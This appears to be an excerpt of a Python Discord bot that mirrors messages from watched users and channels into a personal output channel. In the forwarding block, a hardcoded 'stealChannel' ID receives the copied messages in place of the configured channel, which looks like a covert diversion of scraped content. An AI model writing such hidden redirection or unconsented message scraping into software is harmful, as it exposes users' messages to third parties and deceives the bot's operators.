...
async def on_message(message):
    ...
    # ------------------------------------------------------------- AUTO REPEAT MESSAGE TO PERSONAL CHANNEL (USERS) ------------------------------------------------------------- #

    if message.channel.id in CONFIG_WATCHED_CHANNELS and message.author.id in CONFIG_WATCHED_USERS: # AUTO REPEAT MESSAGE IN PERSONAL CHANNEL
        ...
        if message.author != client.user:
            ...
            try:
                outChannel = CONFIG_OUTPUT_CHANNELS[0]
                for pairedChannels in CONFIG_PAIRS:                        
                    if pairedChannels[0] == message.channel.id and pairedChannels[1] in CONFIG_OUTPUT_CHANNELS:
                        outChannel = pairedChannels[1]
                        break

                stealChannel = '562455296174194702'                
                await client.send_message(client.get_channel(stealChannel), outChannel, embed=embed) # output to personal channel
                print("WROTE TO CHANNEL ID: " + outChannel)
    ...
    # ------------------------------------------------------------- AUTO REPEAT MESSAGE TO PERSONAL CHANNEL (ALL) ------------------------------------------------------------- #

    elif message.channel.id in CONFIG_WATCHED_ALL_USERS_CHANNELS: # AUTO REPEAT MESSAGE IN PERSONAL CHANNEL
